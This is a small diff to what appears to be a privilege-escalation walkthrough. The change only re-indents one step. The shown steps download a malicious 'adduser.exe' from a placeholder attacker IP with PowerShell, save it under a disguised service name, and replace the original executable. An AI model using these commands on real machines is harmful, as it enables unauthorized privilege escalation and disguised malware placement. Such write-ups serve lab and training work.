@@ -80,7 +80,7 @@ Transfer the malicious executable to the target machine and replace the original
    ```
 2. On the target machine, download the malicious file:
    ```powershell
-iwr -Uri http://<attacker_ip>/adduser.exe -OutFile BackendCacheCleanup.exe
+   iwr -Uri http://<attacker_ip>/adduser.exe -OutFile BackendCacheCleanup.exe
    ```
 3. Backup the original executable and replace it:
    ```powershell
